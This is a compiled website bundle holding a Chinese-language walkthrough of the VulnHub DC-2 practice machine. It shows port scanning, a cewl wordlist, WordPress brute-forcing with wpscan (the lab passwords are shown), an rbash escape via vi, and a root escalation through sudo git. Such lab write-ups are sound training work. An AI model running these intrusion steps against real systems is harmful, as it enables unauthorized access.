"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[4253],{868:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>d,contentTitle:()=>l,default:()=>a,frontMatter:()=>t,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/DC-2","title":"DC-2","description":"\u7aef\u53e3\u626b\u63cf","source":"@site/docs/VulnHub/Virtual Machines/DC-2.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/DC-2","permalink":"/docs/VulnHub/Virtual Machines/DC-2","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/DC-2.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"DC-1","permalink":"/docs/VulnHub/Virtual Machines/DC-1"},"next":{"title":"DC-3","permalink":"/docs/VulnHub/Virtual Machines/DC-3"}}');var i=r(4848),c=r(8453);const t={},l="DC-2",d={},o=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",id:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",level:2},{value:"\u7528<code>wpscan</code>\u679a\u4e3e\u4e00\u4e0b\u7528\u6237",id:"\u7528wpscan\u679a\u4e3e\u4e00\u4e0b\u7528\u6237",level:3},{value:"SSH\u767b\u5f55",id:"ssh\u767b\u5f55",level:2},{value:"\u4f7f\u7528<code>vi</code>\u8fdb\u884c\u7ed5\u8fc7rbash",id:"\u4f7f\u7528vi\u8fdb\u884c\u7ed5\u8fc7rbash",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2},{value:"git\u63d0\u6743",id:"git\u63d0\u6743",level:3},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:2}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",strong:"strong",...(0,c.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"dc-2",children:"DC-2"})}),"\n",(0,i.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"nmap -sC -sV -Pn 192.168.56.117\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 08:22 EDT\r\nNmap scan report for 192.168.56.117\r\nHost is up (0.00046s latency).\r\nNot shown: 999 closed tcp ports (reset)\r\nPORT   STATE SERVICE VERSION\r\n80/tcp open  http    Apache httpd 2.4.10 ((Debian))\r\n|_http-title: Did not follow redirect to http://dc-2/\r\n|_http-server-header: Apache/2.4.10 (Debian)\r\nMAC Address: 08:00:27:71:D4:1C (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8bbe\u7f6ehosts\u6587\u4ef6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"192.168.56.117 dc-2\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u76f4\u63a5\u53bb\u770bweb\u9875\u9762"}),"\n",(0,i.jsx)(n.h2,{id:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",children:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528"}),"\n",(0,i.jsx)(n.p,{children:"\u627e\u5230flag1"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Flag 1:\r\n\r\nYour usual wordlists probably won\u2019t work, so instead, maybe you just need to be cewl.\r\n\r\nMore passwords is always better, but sometimes you just can\u2019t win them all.\r\n\r\nLog in as one to see the next flag.\r\n\r\nIf you can\u2019t find it, log in as another.\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53d1\u73b0\u5173\u952e\u5b57",(0,i.jsx)(n.code,{children:"cewl"}),"\uff0ccewl\u53ef\u4ee5\u6536\u96c6web\u9875\u9762\u7684\u5355\u8bcd"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"cewl http://dc-2 -w pass.txt\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"\u7528wpscan\u679a\u4e3e\u4e00\u4e0b\u7528\u6237",children:["\u7528",(0,i.jsx)(n.code,{children:"wpscan"}),"\u679a\u4e3e\u4e00\u4e0b\u7528\u6237"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"wpscan --url http://dc-2 -e u\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540e\u7206\u7834"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"wpscan --url http://dc-2 -U user.txt -P pass.txt\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"| Username: jerry, Password: adipiscing\r\n| Username: tom, Password: parturient\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u767b\u5f55jerry\u627e\u5230flag2"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Flag 2:\r\n\r\nIf you can't exploit WordPress and take a shortcut, there is another way.\r\n\r\nHope you found another entry point.\n"})}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u5982\u679cwordpress\u4e0d\u80fd\u5229\u7528\u4e86\uff0c\u90a3\u5c31\u6362\u4e00\u6761\u8def"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u63d0\u793a\u8bf4wordpess\u6ca1\u6709\u6f0f\u6d1e\u4e86\uff0c\u90a3\u5c31\u518d\u7528nmap\u626b\u4e00\u4e0b\u5176\u4ed6\u7aef\u53e3"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"nmap -p- 192.168.56.117\r\nPORT     STATE SERVICE\r\n80/tcp   open  http\r\n7744/tcp open  raqmon-pdu\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7528sV\u9009\u9879\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"nmap -p 7744 -sV 192.168.56.117\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"PORT     STATE SERVICE VERSION\r\n7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)\r\nMAC Address: 08:00:27:71:D4:1C (Oracle VirtualBox virtual NIC)\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5176\u5b9e\u4ed6\u5c31\u662fSSH\u670d\u52a1"}),"\n",(0,i.jsx)(n.h2,{id:"ssh\u767b\u5f55",children:"SSH\u767b\u5f55"}),"\n",(0,i.jsx)(n.p,{children:"\u4f7f\u7528tom\u767b\u5f55"}),"\n",(0,i.jsxs)(n.h3,{id:"\u4f7f\u7528vi\u8fdb\u884c\u7ed5\u8fc7rbash",children:["\u4f7f\u7528",(0,i.jsx)(n.code,{children:"vi"}),"\u8fdb\u884c\u7ed5\u8fc7rbash"]}),"\n",(0,i.jsx)(n.p,{children:"\u6253\u5f00vi"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"set shell=/bin/bash\r\nshell\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"export PATH=$PATH:/bin\r\nexport PATH=$PATH:/usr/bin\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:(0,i.jsx)(n.code,{children:"flag3.txt"})})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5207\u6362\u5230jerry"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"su - jerry\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u627e\u5230",(0,i.jsx)(n.code,{children:"flag4"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Good to see that you've made it this far - but you're not home yet. \r\n\r\nYou still need to get the final flag (the only flag that really counts!!!).  \r\n\r\nNo hints here - you're on your own now.  :-)\r\n\r\nGo on - git outta here!!!!\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u540e\u5c31\u662f\u8981\u63d0\u6743\u5230root\u4e86"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"sudo -l\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"(root) NOPASSWD: /usr/bin/git\n"})}),"\n",(0,i.jsx)(n.h3,{id:"git\u63d0\u6743",children:"git\u63d0\u6743"}),"\n",(0,i.jsx)(n.p,{children:"\u53ef\u4ee5\u5728\u4e0b\u9762\u7f51\u7ad9\u627e\u5230sudo\u63d0\u6743\u65b9\u6cd5"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://gtfobins.github.io/",children:"GTFOBins"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416215029798.png",alt:"image-20240416215029798"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"sudo git -p help config\r\n!/bin/sh\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u62ff\u5230\u6700\u540e\u7684",(0,i.jsx)(n.code,{children:"final-flag.txt"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416215230308.png",alt:"image-20240416215230308"})}),"\n",(0,i.jsx)(n.h2,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"1.\u8fd9\u4e2a\u9776\u673a\u52065\u4e2aflag\uff0c\u6bcf\u4e00\u6b65\u90fd\u7ed9\u4e86\u4e00\u5b9a\u7684\u63d0\u793a\uff0c\u601d\u8def\u6bd4\u8f83\u660e\u786e"}),"\n",(0,i.jsxs)(n.p,{children:["2.",(0,i.jsx)(n.code,{children:"wpscan"}),"\u4e13\u95e8\u626b\u63cf",(0,i.jsx)(n.code,{children:"wordpress"})]}),"\n",(0,i.jsxs)(n.p,{children:["3.\u7ed5\u8fc7",(0,i.jsx)(n.code,{children:"rbash"}),"\u7684\u65b9\u6cd5\uff0c",(0,i.jsx)(n.a,{href:"https://blog.csdn.net/qq_43168364/article/details/111830233",children:"rbash\u9003\u9038\u65b9\u6cd5\u7b80\u8ff0"})]}),"\n",(0,i.jsxs)(n.p,{children:["4.",(0,i.jsx)(n.code,{children:"git"}),"\u8fdb\u884c\u63d0\u6743,",(0,i.jsx)(n.code,{children:"sudo git -p help config"}),",\u7136\u540e\u8f93\u5165",(0,i.jsx)(n.code,{children:"!/bin/bash"})]}),"\n"]})]})}function a(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>t,x:()=>l});var s=r(6540);const i={},c=s.createContext(i);function t(e){const n=s.useContext(c);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),s.createElement(c.Provider,{value:n},e.children)}}}]);